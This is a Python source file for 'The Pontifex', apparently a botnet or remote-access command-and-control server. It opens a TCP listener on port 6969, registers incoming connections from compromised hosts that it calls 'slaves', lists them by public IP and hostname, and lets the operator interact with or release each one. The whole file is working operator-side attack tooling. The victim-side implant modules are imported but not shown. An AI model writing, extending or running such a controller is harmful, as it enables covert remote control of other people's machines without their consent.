# -*- coding: utf-8 -*-

###############################################################
##   pontifex.py                                             ##
##   The Pontifex                                            ##
##   Created by Kryptosr on 2020-11-03.                      ##
##   Copyright © 2020 Kryptosr. All rights reserved.         ##
###############################################################

import sys, os, threading, time, socket
from prettytable import PrettyTable
from lib.helper import *
from lib.debug import Debug
from lib.c2 import C2
from lib.dmos import Dmos
from prompt_toolkit.shortcuts import prompt

class Pontifex():
    def __init__(self):
        self.ANODE = "0.0.0.0"
        self.APORT = 6969
        self.dmoss = {}
        self.c2 = C2(self.ANODE, self.APORT, self)
        self.isConnected = False
        self.active = False
        self.listener = None

    def cmdline(self):
        while 1:
            cmd = prompt("[Pontifex] → ", style=prompt_style)
            command = cmd.split(' ')[0]
            args = cmd[len(command)+1:]

            if command == "exit":
                Debug.eprint(f"C2 on tcp://{self.ANODE}:{self.APORT} shutting down...")
                self.terminate_server()
                os._exit(1)
            elif command == "clear":
                os.system(CMD_CLEAR)
            elif command == "free":
                self.dmoss[args].conn.send("free".encode())
                terminate(self.dmoss, self.dmoss[args], "gracefully")
            elif command == "list":
                if not self.dmoss:
                    Debug.eprint("There are no slaves online")
                else:
                    t = PrettyTable()
                    t.field_names = ["BORN", "HASH", "GLOBAL IP", "HOSTNAME"]
                    for _, hash in enumerate(self.dmoss):
                        t.add_row([self.dmoss[hash].born, hash, self.dmoss[hash].GLOBAL, self.dmoss[hash].HOSTNAME])
                    print(t)
            elif command == "i":
                try:
                    self.dmoss[args].interact()
                except KeyError:
                    Debug.eprint("Invalid MD5_hash")
            elif command == "r":
                clean(self.c2.s)
                python = sys.executable
                os.execl(python, python, *sys.argv)
    def disconnect_all(self):
        for dmos in self.dmoss:
            dmos.conn.send("free".encode())

    def terminate_server(self):
        self.disconnect_all()
        self.active = False
        if self.listener:
            socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect((self.c2.ANODE,self.c2.APORT))
            self.listener.join()
        time.sleep(0.5)

    def listener_daemon(self):
        while 1:
            if self.active:
                dmos = self.c2.accept_conn()
                if dmos != None:
                    for d in self.dmoss.keys():
                        if d == dmos.md5_hash:
                            self.isConnected = True
                            dmos.conn.send("free".encode())
                    if self.isConnected != True:
                        Debug.sprint(f"Connection from {dmos.md5_hash} ({dmos.GLOBAL})", ANODE=self.ANODE, APORT=self.APORT, thread=True)
                        #dmos.multi_handler = self
                        self.dmoss[dmos.md5_hash] = dmos
            else:
                return

    @safe_exec
    def start_listener_daemon(self):
        self.listener = threading.Thread(target=self.listener_daemon)
        #LISTENER.daemon = True
        try:
            self.active = True
            self.listener.start()
            Debug.tprint(f"TCP server <tcp://{self.ANODE}:{self.APORT}> is online")
        except Exception as e:
            Debug.eprint(f"Unable to start daemon listener, Error: {e}")

    @safe_exec
    def start_c2(self):
        self.c2.listener()

    @safe_exec
    def start_keepAlive(self):
        KEEPALIVE = threading.Thread(target=self.c2.keepAlive)
        KEEPALIVE.start()

if __name__ == "__main__":
    os.system(CMD_CLEAR)
    banner()
    p = Pontifex()
    p.start_c2()
    p.start_listener_daemon()
    p.start_keepAlive()
    p.cmdline()
